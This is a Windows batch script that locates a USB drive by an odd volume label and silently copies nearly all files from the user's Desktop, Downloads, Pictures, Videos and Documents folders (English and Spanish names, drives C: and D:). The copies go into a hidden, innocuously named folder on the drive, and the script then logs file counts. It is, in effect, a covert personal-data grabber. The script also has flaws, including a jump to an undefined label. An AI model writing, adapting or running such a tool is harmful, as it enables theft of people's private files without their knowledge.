@echo off
setlocal enabledelayedexpansion

:: Define the maximum file size
set /A SIZE_ONE_GB=1073741824
set /A MAX_FILE_SIZE=%SIZE_ONE_GB% * 6

:: Define the USB drive letter and directories
set "USB_LABEL=⌡K╥┼╜H╥R"

for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        for /f "tokens=1,2 delims=:" %%a in ('wmic logicaldisk where "DeviceID='%%d:'" get VolumeName^, DeviceID ^| findstr /i "%USB_LABEL%"') do (
            echo %%a
            if "%%a"=="%USB_LABEL%" (
                set USB_DRIVE=%%d:
                goto :found
            )
        )
    )
)

:: Define list of folder names
set "FOLDERS_ENG=Desktop Downloads Pictures Videos Documents"
set "FOLDERS_ESP=Escritorio Descargas Imagenes Documentos"
set "FOLDERS=%FOLDERS_ENG% %FOLDERS_ESP%"

:: Get the current date and time
for /f "tokens=2 delims==" %%I in ('"wmic os get localdatetime /value"') do set datetime=%%I
set "YEAR=%datetime:~2,2%"
set "MONTH=%datetime:~4,2%"
set "DAY=%datetime:~6,2%"
set "HOUR=%datetime:~8,2%"
set "MINUTE=%datetime:~10,2%"

:: Format the date and time
set "DATETIME=%MONTH%%DAY%_%HOUR%"

:: Define destination directory with date and time
set "DEST_DIR=%USB_DRIVE%\log%YEAR%dat"
echo %DEST_DIR%
:: Define extensions for each category
set "EXT_IMAGES=*.jpg *.jpeg *.png *.gif *.bmp *.tiff *.ico *.webp"
set "EXT_VIDEOS=*.mp4 *.mkv *.avi *.mov *.wmv *.flv"
set "EXT_AUDIO=*.mp3 *.wav *.flac *.aac *.ogg"
set "EXT_DOCUMENTS=*.doc *.docx *.txt *.pdf *.csv *.xls *.xlsx *.xlsm *.ppt *.pptx"
set "EXT_COMPRESS=*.7z *.zip *.rar"
set "EXT_DEVELOPERS=*.bat *.py *.json *.exe"
set "EXT_OTHERS=*.*" 

:: Combine all extensions into a single variable if needed
set "EXTENSIONS_BASIC=%EXT_IMAGES% %EXT_VIDEOS% %EXT_AUDIO% %EXT_DOCUMENTS% %EXT_COMPRESS%"
set "EXTENSIONS_SPECIAL=%EXT_DEVELOPERS% %EXT_OTHERS%"
set "EXTENSIONS_NORMAL=%EXTENSIONS_BASIC% %EXTENSIONS_SPECIAL%"
::

set "FOLDER=Desktop"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Downloads"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Pictures"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Videos"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Documents"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Escritorio"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Descargas"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Imagenes"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Documentos"
set "FOLDER_PATH=C:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_C\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

::

set "FOLDER=Desktop"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Downloads"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Pictures"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Videos"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Documents"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Escritorio"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Descargas"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Imagenes"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

set "FOLDER=Documentos"
set "FOLDER_PATH=D:\Users\%USERNAME%\%FOLDER%"
set "DEST_DIR_COPY=%DEST_DIR%\%DATETIME%\Disk_D\%FOLDER%"

if exist "%FOLDER_PATH%" (
    if not exist !DEST_DIR! (
        mkdir !DEST_DIR!
        attrib +h !DEST_DIR!
    )
    if not exist !DEST_DIR_COPY! mkdir !DEST_DIR_COPY!
    for /R "%FOLDER_PATH%" %%x in (%EXTENSIONS_NORMAL%) do copy "%%x" "!DEST_DIR_COPY!\"
)

:: Analityc Data
set "DETAILS_DAT=%DEST_DIR%\%DATETIME%"
if not exist %DETAILS_DAT% mkdir %DETAILS_DAT%
set "OUTPUT_FILE=%DEST_DIR%\%DATETIME%\resumedata.txt"

set "EXT_READ=jpg jpeg png gif bmp tiff ico webp mp4 mkv avi mov wmv flv mp3 wav flac aac ogg doc docx txt pdf csv xls xlsx xlsm ppt pptx 7z zip rar"

for %%e in (%EXT_READ%) do (
    
    set "count=0"
    for /f "delims=" %%f in ('dir /b /s "%DETAILS_DAT%\*.%%e" ^| find /c /i "%%e"') do set "count=%%f"
    if !count! gtr 0 (
        echo Ext: %%e - !count! >> "%OUTPUT_FILE%"
    )
)

endlocal